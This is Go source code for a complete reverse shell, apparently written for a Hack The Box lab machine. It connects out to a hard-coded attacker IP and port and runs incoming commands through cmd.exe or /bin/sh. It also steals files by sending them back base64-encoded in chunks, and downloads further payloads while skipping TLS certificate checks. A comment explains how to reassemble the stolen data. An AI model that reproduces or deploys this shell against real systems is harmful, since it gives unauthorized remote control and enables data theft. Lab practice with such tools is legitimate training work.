package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

/**
If the command is sent with the following as a prefix the revShell will do the following:
upload: Will use the net/http library to fetch the given url to download locally a file
upload:http://10.10.10.10:8080/script.ps1

---

download: Will chunk a file at the given path into 1024 characters that are base64 encoded and send them back
download:c:\\tools\\test.txt

To put back together the b64 after downloading...
1. Clean up the output.log
2. Parse out the date time stamp
   cat output.log | sed 's/^.*R\:\s//' | tr -d "\n" | base64 -d > filename.ext

HTB: axlle

**/

type Configuration struct {
	RemoteIP   string `json:"remoteIP"`
	RemotePort string `json:"remotePort"`
}

func main() {
	var config Configuration
	ipPtr := flag.String("ip", "10.10.14.42", "Connection to Remote IP")
	portPtr := flag.String("p", "9004", "Connection to Remote IP")
	flag.Parse()

	config.RemoteIP = *ipPtr
	config.RemotePort = *portPtr

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", config.RemoteIP, config.RemotePort))
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			return
		}

		if strings.Contains(command, "download:") {
			filePath := strings.Replace(command, "download:", "", -1)
			filePath = strings.Replace(filePath, "\r", "", -1)
			filePath = strings.Replace(filePath, "\n", "", -1)
			fileContent, err := os.ReadFile(filePath)
			if err != nil {
				fmt.Printf("Error reading file: %v\n", err)
			}
			encodedContent := base64.StdEncoding.EncodeToString(fileContent)
			chunkSize := 1024
			if len(encodedContent) < chunkSize {
				encodedContent += "\n"
				//fmt.Println(encodedContent)
				conn.Write([]byte(encodedContent))
			} else {
				for offset := 0; offset < len(encodedContent); offset += chunkSize {
					endChunk := offset + chunkSize
					if endChunk > len(encodedContent) {
						endChunk = len(encodedContent)
					}

					chunkContent := encodedContent[offset:endChunk] + "\n"
					//fmt.Println(chunkContent)
					conn.Write([]byte(chunkContent))
					// 1000 Milliseconds are in a second
					time.Sleep(10 * time.Millisecond)
				}
			}

		} else if strings.Contains(command, "upload:") {
			url := strings.Replace(command, "upload:", "", -1)
			url = strings.Replace(url, "\r", "", -1)
			url = strings.Replace(url, "\n", "", -1)
			filename := filepath.Base(url)
			// The below setup ignores the security of the certificate that is presented... (Self-signed and revoked)
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			}
			client := &http.Client{Transport: tr}
			response, err := client.Get(url)
			if err != nil {
				fmt.Println("Error while downloading", url, "-", err)
				return
			}
			defer response.Body.Close()
			if response.StatusCode != http.StatusOK {
				fmt.Println("Server returned non-200 status:", response.Status)
				return
			}
			if len(filename) < 1 {
				filename = "output.txt"
			}
			outputFile, err := os.Create(filename)
			if err != nil {
				fmt.Println("Error while creating file:", err)
				return
			}
			defer outputFile.Close()
			_, err = io.Copy(outputFile, response.Body)
			if err != nil {
				fmt.Println("Error while saving file:", err)
				return
			}
			messageResponse := "Downloaded: " + url + "\n"
			conn.Write([]byte(messageResponse))
		} else {

			var cmd *exec.Cmd
			if runtime.GOOS == "windows" {
				cmd = exec.Command("cmd.exe", "/C", command)
			} else {
				cmd = exec.Command("/bin/sh", "-c", command)
			}

			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Println("Error executing command:", err)
				conn.Write([]byte(fmt.Sprintf("Error: %s\n", err)))
				continue
			}
			conn.Write(output)
		}
	}
}
